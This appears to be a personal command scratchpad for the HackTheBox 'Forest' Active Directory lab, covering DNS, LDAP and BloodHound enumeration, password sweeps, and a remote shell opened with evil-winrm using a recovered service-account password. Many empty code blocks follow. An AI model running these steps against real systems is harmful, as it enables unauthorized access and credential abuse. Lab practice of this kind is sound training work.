[[Editing Copy Page]]

```
dig @10.129.95.210 axfr FOREST.htb.local
```

```
cd ~/Desktop/Tools/Windows && ./nxc-sweep 10.129.95.210 -u Users.txt -p ''
```

```
ldapsearch -v -x -b "DC=htb,DC=local" -H "ldap://10.129.95.210" > ldapsearchoutput.txt
```

```
ldapdomaindump -u 'FOREST.htb.local\andy' -p [PW] 10.129.95.210
```

```
cd ~/Desktop/Tools/Windows && ./nxc-sweep 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
```

```
evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
```

```
bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -dc 10.129.95.210 -c All -ns 10.129.95.210
```

```
xLqra7P3QnuePdbn_2fiug7_fuvChdKA
```

```
cd ~/Desktop/Tools/Windows && ./nxc-sweep 10.129.95.210 -u 'Retric' -p 'pass123'
```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```